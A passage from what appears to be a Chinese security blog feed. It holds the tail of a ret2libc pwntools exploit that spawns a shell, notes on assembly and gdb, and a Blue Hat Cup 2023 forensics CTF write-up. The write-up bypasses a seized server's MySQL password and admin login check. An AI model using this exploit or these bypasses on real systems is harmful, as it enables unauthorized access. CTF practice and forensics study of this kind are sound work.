class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(system_addr) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><blockquote><p>write函数的地址 + 预留返回地址 + write函数的三个参数 （1 + write函数的真正地址（got表内的地址） + 打印的字节）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制前置基础</title>
      <link href="/2024/01/20/pre/"/>
      <url>/2024/01/20/pre/</url>
      
        <content type="html"><![CDATA[<h2 id="常用寄存器及一些汇编指令"><a href="#常用寄存器及一些汇编指令" class="headerlink" title="常用寄存器及一些汇编指令"></a>常用寄存器及一些汇编指令</h2><p>R开头的，64位</p><p>E开头的，32位</p><table><thead><tr><th>寄存器</th><th>命令</th></tr></thead><tbody><tr><td>RIP</td><td>存放当前执行的指令的地址</td></tr><tr><td>RSP</td><td>存放当前栈帧的栈顶地址</td></tr><tr><td>RBP</td><td>存放当前栈帧的栈底地址</td></tr><tr><td>RAX</td><td>通用寄存器。存放函数返回值</td></tr></tbody></table><table><thead><tr><th>汇编指令</th><th>解释</th></tr></thead><tbody><tr><td>add</td><td>add rax,0x20  :  rax&#x3D;rax+0x20</td></tr><tr><td>sub</td><td>sub rbp,0x18  :  rbp&#x3D;rbp-0x18</td></tr><tr><td>xor</td><td>xor ebx,ebx  :  ebx^ebx&#x3D;0</td></tr><tr><td>lea</td><td>lea rax,[rbp-0x18]  :  rax&#x3D;rbp-0x18   （取地址给rax</td></tr><tr><td>test</td><td>test eax,eax  :  eax&amp;eax    &#x2F;&#x2F; eax&#x3D;0-&gt;0  eax!&#x3D;0-&gt;!0</td></tr><tr><td>cmp</td><td>cmp a1,0x61  :  a1-0x61</td></tr><tr><td>JE</td><td>相等时跳转</td></tr><tr><td>JNE</td><td>不相等时跳转</td></tr><tr><td><em><strong>push</strong></em></td><td>压栈，eg：push ebp  :  esp-4，把ebp放入esp指向的地方</td></tr><tr><td><em><strong>pop</strong></em></td><td>弹栈，eg：pop ebp  :  把esp指的地方赋值给ebp，esp+4</td></tr><tr><td>leave</td><td>相当于：mov esp,ebp;pop ebp</td></tr><tr><td>ret</td><td>pop eip</td></tr><tr><td>call</td><td>push eip;jmp func</td></tr><tr><td>mov</td><td>mov a ,b  :  将b中的值写入a</td></tr></tbody></table><h2 id="gdb调试及常用命令"><a href="#gdb调试及常用命令" class="headerlink" title="gdb调试及常用命令"></a>gdb调试及常用命令</h2><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td>b *<num></td><td>设置断点</td></tr><tr><td>d</td><td>删除断点</td></tr><tr><td>disable b id</td><td>断点失效</td></tr><tr><td>enable b id</td><td>断点生效</td></tr><tr><td>i r</td><td>查看寄存器</td></tr><tr><td>i b</td><td>查看寄存器</td></tr><tr><td>c</td><td>继续执行到断点，没断点就一直执行下去</td></tr><tr><td>r</td><td>重新开始执行</td></tr><tr><td>start</td><td>类似于<code>r</code>，停在main函数的开始</td></tr><tr><td>ni</td><td>不进入函数体执行</td></tr><tr><td>si</td><td>进入函数体执行</td></tr><tr><td>finish</td><td>步出</td></tr><tr><td>vmmap</td><td>查看内存情况</td></tr><tr><td>stack</td><td>也是查看寄存器</td></tr><tr><td>cyclic <number></td><td>生成指定number长度的字符串</td></tr><tr><td>cyclic -l <number></td><td>给出该字符串当前的padding（不好用</td></tr><tr><td>distance<num1> <num2></td><td>计算num1和num2的距离（算padding</td></tr><tr><td>set</td><td>修改指定地址的值</td></tr><tr><td>x&#x2F;<num>&lt;n&#x2F;f&#x2F;u&gt;</td><td></td></tr><tr><td><num></td><td>表示打印的数量</td></tr><tr><td><n></td><td>设定打印格式，参数可为<code>o(八进制),x(十六进制),d(十进制),u(无符号十进制),t(二进制),f(浮点类型),a(地址类型),i(解析成命令并反编译,显示地址上的指令信息),c(字符)和s(字符串)</code></td></tr><tr><td><f></td><td>设定输出长度，<code>b(byte),h(halfword),w(word),giant(8bytes)</code></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023蓝帽杯初赛电子取证部分题解</title>
      <link href="/2023/08/28/bluehatcup2023/"/>
      <url>/2023/08/28/bluehatcup2023/</url>
      
        <content type="html"><![CDATA[<blockquote><p>取证案情介绍： 2021年5月，公安机关侦破了一起投资理财诈骗类案件，受害人陈昊民向公安机关报案称其在微信上认识一名昵称为yang88的网友，在其诱导下通过一款名为维斯塔斯的APP，进行投资理财，被诈骗6万余万元。接警后，经过公安机关的分析，锁定了涉案APP后台服务器。后经过公安机关侦查和研判发现杨某有重大犯罪嫌疑，经过多次摸排后，公安机关在杨某住所将其抓获，并扣押了杨某手机1部、电脑1台，据杨某交代，其网站服务器为租用的云服务器。上述检材已分别制作了镜像和调证，假设本案电子数据由你负责勘验，请结合案情，完成取证题目。</p></blockquote><blockquote><p>取证检材容器密码：Hpp^V@FQ6bdWYKMjX&#x3D;gUPG#hHxw!j@M9</p></blockquote><h2 id="【APK取证】涉案apk的包名是？-答题格式-com-baid-ccs"><a href="#【APK取证】涉案apk的包名是？-答题格式-com-baid-ccs" class="headerlink" title="【APK取证】涉案apk的包名是？[答题格式:com.baid.ccs]"></a>【APK取证】涉案apk的包名是？[答题格式:com.baid.ccs]</h2><p> <img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829173605431.png" alt="image-20230829173605431"></p><h2 id="【APK取证】涉案apk的签名序列号是？-答题格式-0x93829bd"><a href="#【APK取证】涉案apk的签名序列号是？-答题格式-0x93829bd" class="headerlink" title="【APK取证】涉案apk的签名序列号是？[答题格式:0x93829bd]"></a>【APK取证】涉案apk的签名序列号是？[答题格式:0x93829bd]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230901222110210.png" alt="image-20230901222110210"></p><h2 id="【APK取证】涉案apk中DCLOUD-AD-ID的值是？-答题格式-2354642"><a href="#【APK取证】涉案apk中DCLOUD-AD-ID的值是？-答题格式-2354642" class="headerlink" title="【APK取证】涉案apk中DCLOUD_AD_ID的值是？[答题格式:2354642]"></a>【APK取证】涉案apk中DCLOUD_AD_ID的值是？[答题格式:2354642]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829173752993.png" alt="image-20230829173752993"></p><h2 id="【APK取证】涉案apk的服务器域名是？-答题格式-http-sles-vips-com"><a href="#【APK取证】涉案apk的服务器域名是？-答题格式-http-sles-vips-com" class="headerlink" title="【APK取证】涉案apk的服务器域名是？[答题格式:http://sles.vips.com]"></a>【APK取证】涉案apk的服务器域名是？[答题格式:<a href="http://sles.vips.com]">http://sles.vips.com]</a></h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829174106948.png" alt="image-20230829174106948"></p><h2 id="【APK取证】涉案apk的主入口是？-答题格式-com-bai-cc-initactivity"><a href="#【APK取证】涉案apk的主入口是？-答题格式-com-bai-cc-initactivity" class="headerlink" title="【APK取证】涉案apk的主入口是？[答题格式:com.bai.cc.initactivity]"></a>【APK取证】涉案apk的主入口是？[答题格式:com.bai.cc.initactivity]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829173957199.png" alt="image-20230829173957199"></p><h2 id="【手机取证】该镜像是用的什么模拟器？-答题格式-天天模拟器"><a href="#【手机取证】该镜像是用的什么模拟器？-答题格式-天天模拟器" class="headerlink" title="【手机取证】该镜像是用的什么模拟器？[答题格式:天天模拟器]"></a>【手机取证】该镜像是用的什么模拟器？[答题格式:天天模拟器]</h2><p>因此为雷电模拟器</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829184001996.png" alt="image-20230829184001996"></p><h2 id="【手机取证】该镜像中用的聊天软件名称是什么？-答题格式-微信"><a href="#【手机取证】该镜像中用的聊天软件名称是什么？-答题格式-微信" class="headerlink" title="【手机取证】该镜像中用的聊天软件名称是什么？[答题格式:微信]"></a>【手机取证】该镜像中用的聊天软件名称是什么？[答题格式:微信]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829175054248.png" alt="image-20230829175054248"></p><h2 id="【手机取证】聊天软件的包名是？-答题格式-com-baidu-ces"><a href="#【手机取证】聊天软件的包名是？-答题格式-com-baidu-ces" class="headerlink" title="【手机取证】聊天软件的包名是？[答题格式:com.baidu.ces]"></a>【手机取证】聊天软件的包名是？[答题格式:com.baidu.ces]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829175211224.png" alt="image-20230829175211224"></p><h2 id="【手机取证】投资理财产品中，受害人最后投资的产品最低要求投资多少钱？-答题格式-1万"><a href="#【手机取证】投资理财产品中，受害人最后投资的产品最低要求投资多少钱？-答题格式-1万" class="headerlink" title="【手机取证】投资理财产品中，受害人最后投资的产品最低要求投资多少钱？[答题格式:1万]"></a>【手机取证】投资理财产品中，受害人最后投资的产品最低要求投资多少钱？[答题格式:1万]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230901222132091.png" alt="image-20230901222132091"></p><h2 id="【手机取证】受害人是经过谁介绍认识王哥？-答题格式-董慧"><a href="#【手机取证】受害人是经过谁介绍认识王哥？-答题格式-董慧" class="headerlink" title="【手机取证】受害人是经过谁介绍认识王哥？[答题格式:董慧]"></a>【手机取证】受害人是经过谁介绍认识王哥？[答题格式:董慧]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829175417948.png" alt="image-20230829175417948"></p><h2 id="【计算机取证】请给出计算机镜像pc-e01的SHA-1值？-答案格式：字母小写"><a href="#【计算机取证】请给出计算机镜像pc-e01的SHA-1值？-答案格式：字母小写" class="headerlink" title="【计算机取证】请给出计算机镜像pc.e01的SHA-1值？[答案格式：字母小写]"></a>【计算机取证】请给出计算机镜像pc.e01的SHA-1值？[答案格式：字母小写]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829183317874.png" alt="image-20230829183317874"></p><h2 id="【计算机取证】给出pc-e01在提取时候的检查员？-答案格式：admin"><a href="#【计算机取证】给出pc-e01在提取时候的检查员？-答案格式：admin" class="headerlink" title="【计算机取证】给出pc.e01在提取时候的检查员？[答案格式：admin]"></a>【计算机取证】给出pc.e01在提取时候的检查员？[答案格式：admin]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829175817529.png" alt="image-20230829175817529"></p><h2 id="请给出嫌疑人计算机内IE浏览器首页地址？-答案格式：http-www-baidu-com"><a href="#请给出嫌疑人计算机内IE浏览器首页地址？-答案格式：http-www-baidu-com" class="headerlink" title="请给出嫌疑人计算机内IE浏览器首页地址？[答案格式：http://www.baidu.com]"></a>请给出嫌疑人计算机内IE浏览器首页地址？[答案格式：<a href="http://www.baidu.com]">http://www.baidu.com]</a></h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829184047688.png" alt="image-20230829184047688"></p><h2 id="【计算机取证】请给出嫌疑人杨某登录理财网站前台所用账号密码？-答案格式：root-x2F-admin"><a href="#【计算机取证】请给出嫌疑人杨某登录理财网站前台所用账号密码？-答案格式：root-x2F-admin" class="headerlink" title="【计算机取证】请给出嫌疑人杨某登录理财网站前台所用账号密码？[答案格式：root&#x2F;admin]"></a>【计算机取证】请给出嫌疑人杨某登录理财网站前台所用账号密码？[答案格式：root&#x2F;admin]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829184221593.png" alt="image-20230829184221593"></p><h2 id="【计算机取证】请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？-答案格式：xxxx-xx"><a href="#【计算机取证】请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？-答案格式：xxxx-xx" class="headerlink" title="【计算机取证】请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？[答案格式：xxxx(xx)]"></a>【计算机取证】请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？[答案格式：xxxx(xx)]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829184411399.png" alt="image-20230829184411399"></p><h2 id="【计算机取证】请给出嫌疑人计算机内文件名为“C盘清理-bat”的SHA-1？-答案格式：字母小写"><a href="#【计算机取证】请给出嫌疑人计算机内文件名为“C盘清理-bat”的SHA-1？-答案格式：字母小写" class="headerlink" title="【计算机取证】请给出嫌疑人计算机内文件名为“C盘清理.bat”的SHA-1？[答案格式：字母小写]"></a>【计算机取证】请给出嫌疑人计算机内文件名为“C盘清理.bat”的SHA-1？[答案格式：字母小写]</h2><p>在disk.img中</p><h2 id="【计算机取证】请给出嫌疑人Vera-Crypt加密容器的解密密码？-答案格式：admin"><a href="#【计算机取证】请给出嫌疑人Vera-Crypt加密容器的解密密码？-答案格式：admin" class="headerlink" title="【计算机取证】请给出嫌疑人Vera  Crypt加密容器的解密密码？[答案格式：admin!@#]"></a>【计算机取证】请给出嫌疑人Vera  Crypt加密容器的解密密码？[答案格式：admin!@#]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829175847669.png" alt="image-20230829175847669"></p><h2 id="【计算机取证】请给出嫌疑人电脑内iSCSI服务器对外端口号？-答案格式：8080"><a href="#【计算机取证】请给出嫌疑人电脑内iSCSI服务器对外端口号？-答案格式：8080" class="headerlink" title="【计算机取证】请给出嫌疑人电脑内iSCSI服务器对外端口号？[答案格式：8080]"></a>【计算机取证】请给出嫌疑人电脑内iSCSI服务器对外端口号？[答案格式：8080]</h2><p>我不懂，因为我看的是3260</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829185426164.png" alt="image-20230829185426164"></p><h2 id="【计算机取证】请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？-答案格式：root-x2F-admin"><a href="#【计算机取证】请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？-答案格式：root-x2F-admin" class="headerlink" title="【计算机取证】请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？[答案格式：root&#x2F;admin]"></a>【计算机取证】请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？[答案格式：root&#x2F;admin]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829190512958.png" alt="image-20230829190512958"></p><p>导出StarWind文件夹然后全局爆搜</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829191035263.png" alt="image-20230829191035263"></p><h2 id="【计算机取证】分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？-答案格式：10000"><a href="#【计算机取证】分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？-答案格式：10000" class="headerlink" title="【计算机取证】分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？[答案格式：10000]"></a>【计算机取证】分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？[答案格式：10000]</h2><p>这里是加密容器，结合之前得到的密码挂载</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829190412153.png" alt="image-20230829190412153"></p><p>得到</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829191221381.png" alt="image-20230829191221381"></p><p>然后excel算一下就行</p><h2 id="【内存取证】请给出计算机内存创建北京时间？-答案格式：2000-01-11-00-00-00"><a href="#【内存取证】请给出计算机内存创建北京时间？-答案格式：2000-01-11-00-00-00" class="headerlink" title="【内存取证】请给出计算机内存创建北京时间？[答案格式：2000-01-11 00:00:00]"></a>【内存取证】请给出计算机内存创建北京时间？[答案格式：2000-01-11 00:00:00]</h2><p>volatility直接嗦，注意选local time</p><h2 id="【内存取证】请给出计算机内用户yang88的开机密码？-答案格式：abc-123"><a href="#【内存取证】请给出计算机内用户yang88的开机密码？-答案格式：abc-123" class="headerlink" title="【内存取证】请给出计算机内用户yang88的开机密码？[答案格式：abc.123]"></a>【内存取证】请给出计算机内用户yang88的开机密码？[答案格式：abc.123]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829175939136.png" alt="image-20230829175939136"></p><h2 id="【内存取证】提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？-答案格式：2000-01-11-00-00-00"><a href="#【内存取证】提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？-答案格式：2000-01-11-00-00-00" class="headerlink" title="【内存取证】提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？[答案格式：2000-01-11  00:00:00]"></a>【内存取证】提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？[答案格式：2000-01-11  00:00:00]</h2><p>这个写错了，弘连不行，但盘古石彳亍</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829191944971.png" alt="image-20230829191944971"></p><h2 id="【内存取证】请给出用户yang88的LMHASH值？-答案格式：字母小写"><a href="#【内存取证】请给出用户yang88的LMHASH值？-答案格式：字母小写" class="headerlink" title="【内存取证】请给出用户yang88的LMHASH值？[答案格式：字母小写]"></a>【内存取证】请给出用户yang88的LMHASH值？[答案格式：字母小写]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829190753043.png" alt="image-20230829190753043"></p><h2 id="【内存取证】请给出用户yang88访问过文件“提现记录-xlsx”的北京时间？-答案格式：2000-01-11-00-00-00"><a href="#【内存取证】请给出用户yang88访问过文件“提现记录-xlsx”的北京时间？-答案格式：2000-01-11-00-00-00" class="headerlink" title="【内存取证】请给出用户yang88访问过文件“提现记录.xlsx”的北京时间？[答案格式：2000-01-11  00:00:00]"></a>【内存取证】请给出用户yang88访问过文件“提现记录.xlsx”的北京时间？[答案格式：2000-01-11  00:00:00]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829192112595.png" alt="image-20230829192112595"></p><h2 id="【内存取证】请给出“VeraCrypt”最后一次执行的北京时间？-答案格式：2000-01-11-00-00-00"><a href="#【内存取证】请给出“VeraCrypt”最后一次执行的北京时间？-答案格式：2000-01-11-00-00-00" class="headerlink" title="【内存取证】请给出“VeraCrypt”最后一次执行的北京时间？[答案格式：2000-01-11  00:00:00]"></a>【内存取证】请给出“VeraCrypt”最后一次执行的北京时间？[答案格式：2000-01-11  00:00:00]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829192148624.png" alt="image-20230829192148624"></p><h2 id="【内存取证】分析内存镜像，请给出用户在“2023-06-20-16-56-57-UTC-0”访问过“维斯塔斯”后台多少次？-答案格式-10"><a href="#【内存取证】分析内存镜像，请给出用户在“2023-06-20-16-56-57-UTC-0”访问过“维斯塔斯”后台多少次？-答案格式-10" class="headerlink" title="【内存取证】分析内存镜像，请给出用户在“2023-06-20  16:56:57 UTC+0”访问过“维斯塔斯”后台多少次？[答案格式:10]"></a>【内存取证】分析内存镜像，请给出用户在“2023-06-20  16:56:57 UTC+0”访问过“维斯塔斯”后台多少次？[答案格式:10]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829192817126.png" alt="image-20230829192817126"></p><h2 id="【内存取证】请给出用户最后一次访问chrome浏览器的进程PID？-答案格式：1234"><a href="#【内存取证】请给出用户最后一次访问chrome浏览器的进程PID？-答案格式：1234" class="headerlink" title="【内存取证】请给出用户最后一次访问chrome浏览器的进程PID？[答案格式：1234]"></a>【内存取证】请给出用户最后一次访问chrome浏览器的进程PID？[答案格式：1234]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829192853517.png" alt="image-20230829192853517"></p><h2 id="【服务器取证】分析涉案服务器，请给出涉案服务器的内核版本？-答案格式：xx-xxx-xxx-xx-xx"><a href="#【服务器取证】分析涉案服务器，请给出涉案服务器的内核版本？-答案格式：xx-xxx-xxx-xx-xx" class="headerlink" title="【服务器取证】分析涉案服务器，请给出涉案服务器的内核版本？[答案格式：xx.xxx-xxx.xx.xx]"></a>【服务器取证】分析涉案服务器，请给出涉案服务器的内核版本？[答案格式：xx.xxx-xxx.xx.xx]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829193223907.png" alt="image-20230829193223907"></p><h2 id="【服务器取证】分析涉案服务器，请给出MySQL数据库的root账号密码？-答案格式：Admin123"><a href="#【服务器取证】分析涉案服务器，请给出MySQL数据库的root账号密码？-答案格式：Admin123" class="headerlink" title="【服务器取证】分析涉案服务器，请给出MySQL数据库的root账号密码？[答案格式：Admin123]"></a>【服务器取证】分析涉案服务器，请给出MySQL数据库的root账号密码？[答案格式：Admin123]</h2><p>并非宝塔中的数据库，而是根目录下单独的一个，这里我只能说很绕qwq，当然后面需要用到的还是宝塔里面的数据库</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829193603224.png" alt="image-20230829193603224"></p><h2 id="【服务器取证】分析涉案服务器，请给出涉案网站RDS数据库地址？-答题格式-xx-xx-xx-xx-xx-xx"><a href="#【服务器取证】分析涉案服务器，请给出涉案网站RDS数据库地址？-答题格式-xx-xx-xx-xx-xx-xx" class="headerlink" title="【服务器取证】分析涉案服务器，请给出涉案网站RDS数据库地址？[答题格式: xx-xx.xx.xx.xx.xx]"></a>【服务器取证】分析涉案服务器，请给出涉案网站RDS数据库地址？[答题格式: xx-xx.xx.xx.xx.xx]</h2><p>改下密码进后台</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829193812288.png" alt="image-20230829193812288"></p><p>看到，当然从.envs也可以看到</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829193914353.png" alt="image-20230829193914353"></p><h2 id="请给出涉网网站数据库版本号-答题格式-5-6-00"><a href="#请给出涉网网站数据库版本号-答题格式-5-6-00" class="headerlink" title="请给出涉网网站数据库版本号? [答题格式: 5.6.00]"></a>请给出涉网网站数据库版本号? [答题格式: 5.6.00]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829194059066.png" alt="image-20230829194059066"></p><h2 id="【服务器取证】请给出嫌疑人累计推广人数？-答案格式：100"><a href="#【服务器取证】请给出嫌疑人累计推广人数？-答案格式：100" class="headerlink" title="【服务器取证】请给出嫌疑人累计推广人数？[答案格式：100]"></a>【服务器取证】请给出嫌疑人累计推广人数？[答案格式：100]</h2><p>这里如果想要进后台的话，需要修复数据库，当然弘连自带的数据库工具也可以跑出数据库，不过自己算的话还是比较麻烦，预期解还是重构起来网站进入后台直接爆翻。 </p><p><a href="https://blog.csdn.net/weixin_40230682/article/details/118703478">相关文章</a></p><p>安装qpress</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget &quot;http://docs-aliyun.cn-hangzhou.oss.aliyuninc.com/assets/attach/183466/cn_zh/1608011575185/qpress-11-linux-x64.tar&quot;</span><br><span class="line">tar xvf qpress-11-linux-x64.tar</span><br><span class="line">chmod 775 qpress</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830013515920.png" alt="image-20230830013515920"></p><p>安装xtrabackup</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.9/binary/redhat/7/x86_64/percona-xtrabackup-24-2.4.9-1.el7.x86_64.rpm</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y percona-xtrabackup-24-2.4.9-1.el7.x86_64.rpm</span><br></pre></td></tr></table></figure></div><p>finalshell直接传数据库</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830014133579.png" alt="image-20230830014133579"></p><p>使用xbstream处理qp.xb文件</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat qp.xb | xbstream -x -v -C /www/server/data</span><br><span class="line"></span><br><span class="line">cat qp.xb | xbstream -x -v -C /www/server/data</span><br><span class="line">innobackupex --decompress --remove-original /www/server/data</span><br><span class="line">innobackupex --defaults-file=/etc/my.cnf --apply-log /www/server/data</span><br><span class="line">chown -R mysql:mysql /www/server/data</span><br></pre></td></tr></table></figure></div><p>然后修改mysql文件</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/my.cnf</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830013908521.png" alt="image-20230830013908521"></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830013934655.png" alt="image-20230830013934655"></p><p>重启mysql服务</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830014351700.png" alt="image-20230830014351700"></p><p>但是还是进不去后台，因为还需要更换一下宝塔面板里的数据库</p><p>更改网站下的.envs文件，将数据库信息改成viplicai数据库的</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830014245981.png" alt="image-20230830014245981"></p><p>添加域名规则或者修改host文件，配合日志中的管理员页面信息进入网站后台</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830015032533.png" alt="image-20230830015032533"></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830015201254.png" alt="image-20230830015201254"></p><p>那么上面其实是我抄的别人的方法复现的，现在我讲讲回家之后和小伙伴们讨论的的另一种重构方法</p><p>首先火眼的数据库分析工具，是可以建立本地数据库服务的</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230902160207695.png" alt="image-20230902160207695"></p><p>那么我们可以直接navicat去连接本地这个数据库</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230902160313181.png" alt="image-20230902160313181"></p><p>连上之后直接转储为.sql后缀的文件，为后续的部署做准备</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230902160352214.png" alt="image-20230902160352214"></p><p>这个时候我们仿真起来服务器，一样修改<code>/etc/my.cnf</code>文件然后重启服务绕过mysql密码</p><p>这边可以看到现在的数据库里是没有viplicai的库的</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/ddfbab547d38fae19aba825c334305c.png" alt="ddfbab547d38fae19aba825c334305c"></p><p>我们这里用navicat走ssh连接该服务器的数据库</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230902160635656.png" alt="image-20230902160635656"></p><p>然后右键-&gt;新建数据库，随便起个名字(vip)，再选择执行SQL语句</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230902160733928.png" alt="image-20230902160733928"></p><p>可以看到成功的把刚刚本地的数据库部署到了服务器上</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230902160827527.png" alt="image-20230902160827527"></p><p>现在我们同样改一下宝塔的web组件的配置</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230902160855376.png" alt="image-20230902160855376"></p><p>发现网站后台的页面已经可以访问了</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230902160919803.png" alt="image-20230902160919803"></p><p>密码不知道，并且我不是很懂他的加密规则，像jwt但又不全是</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830020053763.png" alt="image-20230830020053763"></p><p>我们可以直接去该密码的验证规则</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830015443222.png" alt="image-20230830015443222"></p><p>直接注释掉</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830015502599.png" alt="image-20230830015502599"></p><p>任意密码登录成功</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830101151165.png" alt="image-20230830101151165"></p><p>那么除了修改验证规则，我们也可以选择修改报错信息，让他把密码以报错信息的形式输出出来</p><p>将原本的<code>密码不正确</code>修改为解密后的密码</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230902161020627.png" alt="image-20230902161020627"></p><p>用户名输对，然后密码随意</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230902161124763.png" alt="image-20230902161124763"></p><p>不过虽然有了正确的密码，现在还出现了另一个问题</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230902161147252.png" alt="image-20230902161147252"></p><p>根据报错，我们定位到这段记录登录时段的语句，然后直接删除</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230902161221211.png" alt="image-20230902161221211"></p><p>好</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230902161309067.png" alt="image-20230902161309067"></p><p>接下来爆翻</p><p><img 